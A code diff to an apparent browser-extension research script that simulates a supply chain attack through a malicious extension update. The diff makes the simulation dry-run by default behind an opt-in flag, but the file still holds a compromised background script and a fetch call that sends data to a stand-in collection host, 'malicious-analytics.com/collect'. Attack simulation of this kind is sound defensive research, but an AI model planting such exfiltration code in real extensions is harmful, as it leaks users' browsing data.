@@ -1,10 +1,9 @@
 /**
  * Research: Supply Chain Attack Simulation — Malicious Extension Update
  *
- * AUTHORIZED RESEARCH ONLY. This script implements an actionable simulation
- * of a supply chain attack (T1195.002) and the corresponding defensive response.
- *
- * RESTORATION: Functional logic implemented per UIP V1.5. (Scenario s2)
+ * AUTHORIZED RESEARCH ONLY. This script models a supply chain attack
+ * (T1195.002) and the corresponding defensive response. It is dry-run by
+ * default so public readers do not accidentally emit traffic.
  *
  * Reference: https://attack.mitre.org/techniques/T1195/002/
  */
@@ -22,7 +21,7 @@ chrome.runtime.onInstalled.addListener(({ reason }) => {
 
 /**
  * COMPROMISED VERSION (Scenario s2)
- * RESTORATION: Functional exfiltration logic.
+ * This is intentionally represented as source text for diff/entropy analysis.
  */
 const COMPROMISED_BACKGROUND = `
 // SCENARIO s2: Functional exfiltration via fetch (T1041)
@@ -49,8 +48,9 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
 `;
 
 /**
- * Actionable Simulation (Scenario s2)
- * This function actually executes the 'compromised' logic to trigger the monitor.
+ * Optional Simulation (Scenario s2)
+ * Set RUN_MUTETUBE_RESEARCH_SIM=true in a controlled extension lab before
+ * allowing any fetch attempt. Default behavior is print-only.
  */
 function runFunctionalSimulation() {
     console.warn('[RESEARCH s2] Starting functional supply chain simulation...');
@@ -59,6 +59,11 @@ function runFunctionalSimulation() {
     const mockC2 = 'https://malicious-analytics.com/collect';
     
     console.log('[RESEARCH s2] Attempting exfiltration to:', mockC2);
+
+    if (globalThis.RUN_MUTETUBE_RESEARCH_SIM !== true) {
+        console.warn('[RESEARCH s2] Dry run only. No network request sent.');
+        return;
+    }
     
     // Triggering the actual fetch (which will be caught by background.js if run there)
     fetch(mockC2, {
